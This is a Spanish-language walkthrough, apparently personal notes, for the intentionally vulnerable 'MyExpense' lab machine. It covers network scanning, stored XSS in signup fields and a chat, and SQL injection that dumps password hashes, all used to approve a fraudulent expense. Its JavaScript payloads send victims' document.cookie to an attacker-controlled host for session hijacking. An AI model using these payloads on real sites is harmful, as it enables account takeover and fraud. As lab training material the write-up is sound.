----------

**IP:**
**SO:**
**Vulns:**

------------------------------------------

Para esta maquina se tiene que reconfigurar la interfaz de red, esto no es mas que aplastar la tecla e en el panel del bios y modificar la parte del `ro quiet` como `rw init=/bin/bash`, luego un Ctrl + x , ya con esto obtenemos una bash, recordar revisar cual es la interfaz de red `ip a` donde el nombre que sea lo modificamos en el archivo `/etc/network/interfaces.d` correctamente.

En este punto lo primero que se va a hacer es analizar cual es la maquina, en este caso al estar en el mismo segmento de red vamos a usar [[Arp-Scan]] para obtener la maquina:

```bash
arp-scan -I eth0 --localnet --ignoredups
```

![[Pasted image 20250824203224.png]]

como podemos observar ya tenemos la IP de la maquina, esto es fácil de ver ya que es una vmware por lo tanto es `192.168.1.103`.

Vamos con ayuda de ping a ver que tipo de sistema esta corriendo:

```bash
ping -c 1 192.168.1.103
```

![[Pasted image 20250824204137.png]]

vemos un `ttl=64` lo que nos dice que estamos ante un sistem Linux.

ya con esto vamos a comenzar con el escaneo de puertos con ayuda de [[Nmap]]:

```bash
nmap -p- --open -sS --min-rate 5000 -v -n -Pn 192.168.1.103 -oG allPorts
```

![[Pasted image 20250824204355.png]]

ahora conociendo los puertos abiertos vamos a realizar un escaneo mucho mas preciso para los puertos abiertos:

```bash
nmap -p80,37541,45353,46527,59679 -sCV 192.168.1.103 -oN target
```

![[Pasted image 20250824204602.png]]

vemos ya información mucho mas preciso de los puertos abiertos. podemos aprovechar la version del puerto 80 para ver el codename de la maquina, con ayuda de launchpad.

![[Pasted image 20250824204802.png]]
podemos ver que es una maquina Debian `Stretch`.

En este punto vemos que tenemos el puerto `80` por lo que podemos ir a ver la web para ver que encontramos dentro:

![[Pasted image 20250824204914.png]]

podemos ver el login y una web para crear una cuenta pero antes de comenzar con eso sigamos escaneando un poco la web a ver si logramos encontrar algo con ayuda de [[Gobuster]]

```bash
gobuster dir -u http://192.168.1.103 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
```

![[Pasted image 20250824205519.png]]

podemos observar una ruta admin la cual es la siguiente:

![[Pasted image 20250824205556.png]]

al parecer no podemos acceder a esta web a menos que tengamos credenciales, ahora vamos a tratar de hacer reconocimiento de nuevo con [[Gobuster]] pero ahora sobre el directorio admin a ver si descubrimos algo, además gracias la wappalyzer podemos observar que se esta usando como lenguaje php:
![[Pasted image 20250824205732.png]]

```bash
gobuster dir -u http://192.168.1.103/admin -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php
```

![[Pasted image 20250824205855.png]]

podemos observar que encontró dentro de admin un `admin.php` que contiene lo siguiente:

![[Pasted image 20250824205949.png]]

podemos ver mucha información como que el admin es `rmasson` y muchos mas usuarios, a demás de sus roles y que claro nuestra cuenta ya se encuentra inactiva.

Al pulsar sobre el `inactive` vemos lo siguiente:

![[Pasted image 20250824210115.png]]

en la url vemos lo que al parecer es un intento de activar la cuenta pero no podemos hacerlo.

Por el lore del ejercicio tenemos que el la persona se llama  `samuel` y que su contraseña era `fzghn4lw` pero no teníamos el usuario, lo que podemos hacer en este momento es ver el usuario en la tabla que es `slamotte` e intentar ingresar a la cuenta.

![[Pasted image 20250824210421.png]]

vemos que nos dice que la cuenta se encuentra bloqueada. Por el momento no podemos hacer mucho por lo cual vemos si nos deja crear una cuenta sin mucha información:

![[Pasted image 20250824210535.png]]

ya llenamos los datos, pero el botón se encuentra deshabilitado, pero el como esta deshabilitado que es por cambio del mouse puede que sea solo mediante html por lo que podemos revisar a ver si lo podemos habilitar:

![[Pasted image 20250824210722.png]]

vemos que ese botón en especifico tiene  `disable=""` la cual podemos quitar a ver si nos deja continuar:

![[Pasted image 20250824211029.png]]

en efecto quitándolo podemos pasar.

![[Pasted image 20250824211051.png]]

como vemos la cuenta fue creada, ahora si revisamos la web de `/admin/admin.php` tendríamos que ver el nuevo usuario.

![[Pasted image 20250824211149.png]]

pero vemos que esta inactivo, algo que si llama nuestra atención es que los valores del Firstname y Lastname están tal cual como los pusimos por lo que en esos campos y también en el usuario podremoa tratar de hacer un [[Cross-Site Scripting XSS]] tratando de cargar una alerta:

![[Pasted image 20250824211447.png]]

vamos ahora a enviar para ver si logramos ver la alerta:

![[Pasted image 20250824211548.png]]

vemos que tenemos la alerta lo que es buena señal y en realidad la alerta se repite por lo que podemos pensar que en cualquiera de los dos podemos ingresar scripts.

En este punto lo que vamos a ver si logramos es robar alguna cookie de session de algún usuario que este continuamente ingresando a esta web, para esto es sencillo levantamos sun servidor al cual va a llegar la petición con la cookie y luego mediante un script externo en Java Script mediante un nuevo usuario vamos a intentar que el usuario nos envíe la cookie de session:

Lo primero que vamos a hacer es crear el usuario que llame al script externo y levantar el servidor:

![[Pasted image 20250824212036.png]]

![[Pasted image 20250824212453.png]]

enviamos y listo, pero antes de entrar nosotros lo que vamos a hacer es ver si nos llega una petición porque si es así alguien esta constantemente en la página:

![[Pasted image 20250824212647.png]]

como observamos tenemos peticiones lo que sugiere que alguien si esta en la web continuamente por lo que en este caso vamos a comenzar con la creación del script:

Lo primero es ver si logramos secuestrarle la cookie al usuario:

```js
var request = new XMLHttpRequest();
request.open('GET', "http://192.168.1.70/?cookie=" + document.cookie);
request.send();
```

![[Pasted image 20250824213044.png]]

Como podemos ver logramos secuestrar la cookie por lo tanto vamos a acceder como el usuario y ver quien es el que nos dio acceso:

![[Pasted image 20250824213241.png]]

al parecer es el usuario administrador pero nos dice que como administrador solo una persona puede estar dentro a la vez, pero ya sabemos quien es y en realidad es algo bueno ya que si lo analizamos un poco podemos hacer que mediante el script externo el usuario admin que esta monitoreando la web continuamente realize la petición para que active la cuenta.

La cuenta que vamos a activar es samuel y recordemos que al darle al activar nos salía:

![[Pasted image 20250824210115.png]]

lo que al parecer es una petición por get que activa la cuenta de samuel por lo que vamos a intentar que el administrador ejecute esa petición para activar nuestra cuenta con el script de la siguiente manera:

```bash
var request = new XMLHttpRequest();
request.open('GET', "http://192.168.1.103/admin/admin.php?id=11&status=active");
request.send();
```

el nuevo script lo que hace es enviar la petición de quien cargue el script por lo que vamos a levantar el servidor para que se conecte al script y cuando tengamos la petición quiere decir que la cuenta se activo:

![[Pasted image 20250824213951.png]]

como vemos ya se denoto la petición y si vemos la pagina de `admin/admin.php` vamos a ver que se activo la cuenta:

![[Pasted image 20250824214036.png]]

En este punto vamos ingresar a la cuenta:

![[Pasted image 20250824214321.png]]

como podemos observar ya logramos ingresar a la cuenta.

![[Pasted image 20250824214405.png]]

El objetivo es enviar una solicitud de pago que es esa por lo que vamos a enviarla.

![[Pasted image 20250824214500.png]]

vemos que dice submitted pero lo que nosotros queremos es que este aceptada para poder retirar el pago, entonces vamos a intentar ver quien es el que se encarga de aceptar los pagos.

![[Pasted image 20250824214607.png]]

revisando encontramos que nuestro manager es Manon Riviere, lo que quiere decir que posible mente el es el que nos tiene que aceptar el pago. Si lo revisamos veremos que este usuario es un manager y de forma general tiene que el tener alguna pagina extra desde la cual se aceptara los pagos, entonces el propósito en este punto es encontrar la forma de robarle la cuenta.

![[Pasted image 20250824214843.png]]

si observamos en el Home al parecer allí están algunos usuarios incluido el Manon Riviere lo que podríamos intentar es ver si logramos inyectar un XSS para robarle la cookie.

En este punto vamos a intentar lo mismo de antes para robarle la cookie a los usuarios del chat esperando también lograrlo obtener la que nos intereza:

```js
var request = new XMLHttpRequest();
request.open('GET', "http://192.168.1.70:4646/?cookie=" + document.cookie);
request.send();
```

variamos un poco para evitar conflictos con el de la otra pagina.

Ahora el mensaje malicioso lo veremos de la siguiente manera:

![[Pasted image 20250824215548.png]]

y una vez enviado esperamos a ver las conexiones en nuestro servidor:

![[Pasted image 20250824215638.png]]

como podemos ver tenemos varias cuentas, recordemos que el usuario administrador no puede estar multiples veces dentro pero los demás puede que si por lo que vamos a intentar una por una las cookies a ver si llegamos a la cuenta de Manon Riviere:

`1ua1glfeiqo3k7m1qd5gmr6495` esta es la cookie para Manon Riviere y ya estamos en us cuenta:

![[Pasted image 20250824215914.png]]

Listo ya estamos dentro por lo que vamos a ver los reportes  a ver con que nos encontramos:

![[Pasted image 20250824215954.png]]

vemos que sale nuestro pedido y lo vamos a aceptar para ver que sucede ya:

![[Pasted image 20250824220051.png]]

vemos que nos sale que el pago a sido validado pero no aceptado por lo que pude ser que el también tenga que manager o alguien mas que acepta las solicitudes:

![[Pasted image 20250824220205.png]]
Vemos que el también tiene un manager y al parecer es `Paul Baudouin` por lo que ahora vamos a intentar ingresar a la cuenta de este usuario, pero primero vemos si talvez el estaba en el chat y también logramos capturar su cookie de session:

![[Pasted image 20250824220400.png]]

si esta en el chat pero comprobando con todas las cookies no podemos obtener la de el por lo que no esta pendiente del chat.

Revisando la web en la subweb de `Renes` vemos algo familiar en la url:

![[Pasted image 20250824220521.png]]

vemos algo como un `id=2` y esto talvez puede ser una [[SQLI]] así que vamos a intarlo:

![[Pasted image 20250824220747.png]]

vemos que si es vulnerable a [[SQLI]] por lo que vamos a explotarla:

![[Pasted image 20250824220944.png]]
vemos el 1 y 2 en la respuesta por lo que vamos a comenzar a inyectar comando:

![[Pasted image 20250824221058.png]]
Listamos las bases de datos disponibles y la que llama la atención es la de `myexpense`.

![[Pasted image 20250824221253.png]]

Vemos una opción de `user`, vamos a investigar:
![[Pasted image 20250824221433.png]]

ahora vemos las opciones de `username` y `password` por lo que vamos a intentar ver que logramos obtener de alli:

![[Pasted image 20250824221617.png]]

vemos que obtuvimos todos los usuario y contraseñas pero el que nos interesa es el de `pbaudouin (64202ddd5fdea4cc5c2f856efef36e1a)` donde al parecer la contraseña esta encriptada por lo que vamos a tratar de regresarla a la normalidad, primero identificamos el hash con ayuda de alguna herramienta:

![[Pasted image 20250824222119.png]]

como vemos es `MD5` por lo que podemos tratar de romperla en alguna web:

![[Pasted image 20250824222227.png]]

la password al parecer es `HackMe` por lo que vamos a intentar ingresar con las credenciales:

![[Pasted image 20250824222341.png]]

ya logramos ingresar y si vemos tenemos una opción de `Exprense reports` por lo que vamos a ver si esta nuestro reporte:

![[Pasted image 20250824222427.png]]

como podemos ver si esta por lo que vamos a aprobar el nuestro:

![[Pasted image 20250824222458.png]]

como vemos por fin ya esta nuestro pago y con esto nuestro objetivo principal.

Maquina Terminada!!!!!!!